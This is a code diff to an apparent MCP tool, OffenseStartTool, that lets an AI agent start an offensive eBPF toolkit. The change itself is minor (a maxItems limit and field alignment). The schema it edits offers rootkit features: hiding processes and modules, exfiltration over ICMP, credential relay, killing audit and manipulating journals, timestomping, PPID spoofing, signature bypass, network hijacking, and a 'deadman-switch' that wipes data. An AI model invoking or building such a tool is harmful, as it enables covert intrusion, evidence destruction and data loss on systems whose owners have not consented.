@@ -79,7 +79,7 @@ func (t *OffenseStartTool) InputSchema() json.RawMessage {
 			"features": {
 				"type": "array",
 				"items": {"type": "string"},
-				"maxItems": 43,
+				"maxItems": 42,
 				"description": "Feature flag names without the --enable- prefix (e.g. [\"memfd\",\"kprobe-evasion\"]). Valid names: netns-hide, bpf-cloak, module-mask, memfd, syslog-strip, icmp-exfil, socket-clone, cred-relay, container-probe, kprobe-evasion, tail-calls, ftrace-blind, bpf-iter-abuse, vdso-hook, shm-covert, uffd-inject, coredump-suppress, isn-covert, ipv6-ext, arp-poison, port-knock, bgp-hijack, dr-abuse, pmc-covert, tsc-sidechan, audit-kill, inode-slack, journal-manip, proc-spoof, initramfs, modsign-bypass, polymorphic, phantom-stack, container-lateral, dma-covert, behavioral-ai, supply-chain, bpf-parasitism, kernel-object, network-stealth, persistence2, deadman-switch. Note: deadman-switch is destructive (scorched-earth wipe); prefer the deadman_switch param for explicitness"
 			},
 			"hide_pid": {
@@ -127,18 +127,18 @@ func (t *OffenseStartTool) InputSchema() json.RawMessage {
 
 func (t *OffenseStartTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
 	var input struct {
-		LogsDir         string   `json:"logs_dir"`
-		Iface           string   `json:"iface"`
-		Features        []string `json:"features"`
-		HidePID         *int     `json:"hide_pid"`
-		ObfuscateInode  *int     `json:"obfuscate_inode"`
-		MonitorTTY      string   `json:"monitor_tty"`
-		SpoofPPID       string   `json:"spoof_ppid"`
-		Timestomp       string   `json:"timestomp"`
-		PinMaps         bool     `json:"pin_maps"`
-		Verbose         bool     `json:"verbose"`
-		DeadmanSwitch   bool     `json:"deadman_switch"`
-		WipeBytecode    bool     `json:"wipe_bytecode"`
+		LogsDir        string   `json:"logs_dir"`
+		Iface          string   `json:"iface"`
+		Features       []string `json:"features"`
+		HidePID        *int     `json:"hide_pid"`
+		ObfuscateInode *int     `json:"obfuscate_inode"`
+		MonitorTTY     string   `json:"monitor_tty"`
+		SpoofPPID      string   `json:"spoof_ppid"`
+		Timestomp      string   `json:"timestomp"`
+		PinMaps        bool     `json:"pin_maps"`
+		Verbose        bool     `json:"verbose"`
+		DeadmanSwitch  bool     `json:"deadman_switch"`
+		WipeBytecode   bool     `json:"wipe_bytecode"`
 	}
 	if err := json.Unmarshal(params, &input); err != nil {
 		return errorResult("invalid input: " + err.Error()), nil
